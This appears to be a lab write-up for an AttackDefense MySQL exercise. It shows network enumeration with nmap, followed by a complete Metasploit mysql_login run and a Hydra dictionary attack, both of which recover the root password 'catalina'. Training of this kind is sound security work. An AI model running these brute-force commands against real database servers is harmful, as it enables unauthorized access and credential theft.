### SQL2

Questions

1. Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
2. Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
2288: eth0@if2289: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.10/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
2291: eth1@if2292: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:bb:4a:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.187.74.2/24 brd 192.187.74.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ping]]

```
root@attackdefense:~# ping -c 5 192.187.74.3
PING 192.187.74.3 (192.187.74.3) 56(84) bytes of data.
64 bytes from 192.187.74.3: icmp_seq=1 ttl=64 time=0.075 ms
64 bytes from 192.187.74.3: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 192.187.74.3: icmp_seq=3 ttl=64 time=0.046 ms
64 bytes from 192.187.74.3: icmp_seq=4 ttl=64 time=0.042 ms
64 bytes from 192.187.74.3: icmp_seq=5 ttl=64 time=0.038 ms

--- 192.187.74.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 106ms
rtt min/avg/max/mdev = 0.038/0.051/0.075/0.015 ms
```

[[Hack2.0/NMAP#General Scan|NMAP scan]]

```
root@attackdefense:~# nmap -sV -O 192.187.74.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-11 08:38 UTC
Nmap scan report for target-1 (192.187.74.3)
Host is up (0.000052s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
MAC Address: 02:42:C0:BB:4A:03 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=7/11%OT=3306%CT=1%CU=30195%PV=N%DS=1%DC=D%G=Y%M=0242C0
OS:%TM=64AD1507%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II
OS:=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7
OS:%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%
OS:W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
OS:I=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
```

[[metasploit]]

```
msf5 > search mysql

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   1   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   3   auxiliary/admin/mysql/mysql_enum                                       normal     No     MySQL Enumeration Module
   4   auxiliary/admin/mysql/mysql_sql                                        normal     No     MySQL SQL Generic Query
   5   auxiliary/admin/tikiwiki/tikidblib                    2006-11-01       normal     No     TikiWiki Information Disclosure
   6   auxiliary/analyze/jtr_mysql_fast                                       normal     No     John the Ripper MySQL Password Cracker (Fast Mode)
   7   auxiliary/gather/joomla_weblinks_sqli                 2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
   8   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal     Yes    MySQL Authentication Bypass Password Dump
   9   auxiliary/scanner/mysql/mysql_file_enum                                normal     Yes    MYSQL File/Directory Enumerator
   10  auxiliary/scanner/mysql/mysql_hashdump                                 normal     Yes    MYSQL Password Hashdump
   11  auxiliary/scanner/mysql/mysql_login                                    normal     Yes    MySQL Login Utility
   12  auxiliary/scanner/mysql/mysql_schemadump                               normal     Yes    MYSQL Schema Dump
   13  auxiliary/scanner/mysql/mysql_version                                  normal     Yes    MySQL Server Version Enumeration
   14  auxiliary/scanner/mysql/mysql_writable_dirs                            normal     Yes    MYSQL Directory Write Test
   15  auxiliary/server/capture/mysql                                         normal     No     Authentication Capture: MySQL
   16  exploit/linux/mysql/mysql_yassl_getname               2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow
   17  exploit/linux/mysql/mysql_yassl_hello                 2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow
   18  exploit/multi/http/manage_engine_dc_pmp_sqli          2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   19  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
   20  exploit/multi/mysql/mysql_udf_payload                 2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution
   21  exploit/unix/webapp/kimai_sqli                        2013-05-21       average    Yes    Kimai v0.9.2 'db_restore.php' SQL Injection
   22  exploit/unix/webapp/wp_google_document_embedder_exec  2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure
   23  exploit/windows/mysql/mysql_mof                       2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   24  exploit/windows/mysql/mysql_start_up                  2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   25  exploit/windows/mysql/mysql_yassl_hello               2008-01-04       average    No     MySQL yaSSL SSL Hello Message Buffer Overflow
   26  exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
   27  post/linux/gather/enum_configs                                         normal     No     Linux Gather Configurations
   28  post/linux/gather/enum_users_history                                   normal     No     Linux Gather User History
   29  post/multi/manage/dbvis_add_db_admin                                   normal     No     Multi Manage DbVisualizer Add Db Admin


msf5 > info auxiliary/scanner/mysql/mysql_login

       Name: MySQL Login Utility
     Module: auxiliary/scanner/mysql/mysql_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Bernardo Damele A. G. <bernardo.damele@gmail.com>

Check supported:
  Yes

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  BLANK_PASSWORDS   false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false            no        Add all users in the current database to the list
  PASSWORD                           no        A specific password to authenticate with
  PASS_FILE                          no        File containing passwords, one per line
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                             yes       The target address range or CIDR identifier
  RPORT             3306             yes       The target port (TCP)
  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
  THREADS           1                yes       The number of concurrent threads
  USERNAME                           no        A specific username to authenticate as
  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS      false            no        Try the username as the password for all users
  USER_FILE                          no        File containing usernames, one per line
  VERBOSE           true             yes       Whether to print output for all attempts

Description:
  This module simply queries the MySQL instance for a specific 
  user/pass (default is root with blank).

References:
  https://cvedetails.com/cve/CVE-1999-0502/

msf5 > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary(scanner/mysql/mysql_login) > set rhosts 192.187.74.3
rhosts => 192.187.74.3
msf5 auxiliary(scanner/mysql/mysql_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting                                                    Required  Description
   ----              ---------------                                                    --------  -----------
   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                              no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                              no        Add all users in the current database to the list
   PASSWORD                                                                             no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        File containing passwords, one per line
   Proxies                                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.187.74.3                                                       yes       The target address range or CIDR identifier
   RPORT             3306                                                               yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host
   THREADS           1                                                                  yes       The number of concurrent threads
   USERNAME                                                                             no        A specific username to authenticate as
   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                              no        Try the username as the password for all users
   USER_FILE                                                                            no        File containing usernames, one per line
   VERBOSE           true                                                               yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
stop_on_success => true
msf5 auxiliary(scanner/mysql/mysql_login) > set verbose false 
verbose => false
msf5 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.187.74.3:3306     - 192.187.74.3:3306 - Success: 'root:catalina'
[*] 192.187.74.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_login) >
```

[[Hack2.0/hydra|hydra]]

```
root@attackdefense:~# hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.187.74.3 mysql
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-11 08:44:25
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
[DATA] attacking mysql://192.187.74.3:3306/
[3306][mysql] host: 192.187.74.3   login: root   password: catalina
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-11 08:45:20
```

